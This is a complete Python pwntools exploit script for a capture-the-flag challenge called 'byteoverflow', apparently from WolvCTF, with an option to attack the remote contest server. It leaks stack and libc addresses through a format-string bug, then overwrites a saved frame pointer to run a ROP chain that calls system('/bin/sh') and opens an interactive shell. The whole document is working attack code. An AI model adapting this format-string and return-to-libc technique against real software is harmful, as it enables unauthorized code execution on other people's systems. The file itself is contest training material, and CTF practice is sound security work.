#!/usr/bin/env python3
import sys
from pwn import *

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = './byteoverflow'
elf = ELF(TARGET)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def attach(r):
    if not REMOTE:
        bkps = []
        cmds = []
        
        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
    return

def exploit(r):
    attach(r)
    
    # makeComment
    r.sendlineafter(b'3) EXIT\n', b'2')
    r.sendlineafter(b'Please write your comment below: \n\n', b'%38$p %45$p')
    r.recvuntil(b'Your comment is the following: \n')
    
    sfp, libc_main = map(lambda x: int(x, 16), r.recvline().strip().decode().split(' '))
    libc_base = libc_main - libc.libc_start_main_return
    binsh = libc_base + next(libc.search(b'/bin/sh'))
    system = libc_base + libc.sym['system']
    
    log.info(f'libc_base: {hex(libc_base)}')
    log.info(f'binsh: {hex(binsh)}')
    log.info(f'system: {hex(system)}')
    log.info(f'sfp: {hex(sfp)}')
    
    payload = b'A' * (0x120 - (sfp & 0xff))
    payload += b'A' * 8 # SFP
    payload += p64(0x401016) # ret
    payload += p64(0x40148b) # pop rdi; ret
    payload += p64(binsh)
    payload += p64(system)

    # lookPost - SFP overwrite
    r.sendlineafter(b'3) EXIT\n', b'1')
    r.sendlineafter(b'3) The Secret Society of Silent Print Statements - Debugging in Stealth Mode\n\n\n', payload + b'A' * (0x100 - len(payload)) + b'\x00')
    
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('byteoverflow.wolvctf.io', 1337)
    else:
        REMOTE = False
        r = process([TARGET,])
        
    exploit(r)
    exit(0)